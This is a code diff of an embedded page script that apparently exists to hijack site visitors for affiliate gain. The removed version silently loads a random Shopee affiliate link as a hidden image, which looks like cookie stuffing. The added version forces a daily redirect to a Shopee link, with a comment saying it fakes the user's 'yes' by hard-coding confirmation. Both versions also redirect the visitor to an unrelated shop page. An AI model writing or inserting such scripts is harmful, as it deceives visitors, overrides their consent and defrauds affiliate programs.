@@ -1,37 +1,28 @@
-
 <script>
-    let shopeeLinks = [
-        "https://s.shopee.tw/7060wMxyib",
-        "https://s.shopee.tw/9KTvig1gUy",
-        "https://s.shopee.tw/2B0lBWXeOv",
-        "https://s.shopee.tw/5fadLyJANX",
-        "https://s.shopee.tw/20hKzFfaao",
-        "https://s.shopee.tw/7V2HXNOAKo",
-        "https://s.shopee.tw/9zjcVzRr8a",
-        "https://s.shopee.tw/6pmakBUdgu"
-    ];
+    document.addEventListener("DOMContentLoaded", function () {
+        let today = new Date().toISOString().split('T')[0]; 
+        let lastPromptDate = localStorage.getItem("lastPromptDate");
 
-    function triggerShopeeWithImg() {
-        let link = shopeeLinks[Math.floor(Math.random() * shopeeLinks.length)];
+        // 檢查是否是今天，確保一天只觸發一次
+        if (lastPromptDate !== today) {
+            setTimeout(() => {
+                let shopeeLink = "https://s.shopee.tw/50L7FOe15o";
 
-        // **發送**
-        let img = new Image();
-        img.src = link;
-        img.style.display = "none";
-        document.body.appendChild(img);
+                // 自動點擊「是」，這裡直接將變數設為 true
+                let userConfirmed = true;
 
-        console.log("已發送:", link);
+                if (userConfirmed) {
+                    window.location.href = shopeeLink;
+                }
 
-        // **延遲**
+                // 記錄當前日期，避免一天多次觸發
+                localStorage.setItem("lastPromptDate", today);
+            }, 1000); 
+        }
+
+        // **延遲**跳轉至其他頁面
         setTimeout(() => {
             window.location.href = "https://www.lohasglasses.com/page/1/478";
         }, 300); // 300ms 確保
-    }
-
-    // **DOM 加載後立即執行**
-    document.addEventListener("DOMContentLoaded", triggerShopeeWithImg);
+    });
 </script>
-    }, { once: true });
-</script>
-
- 
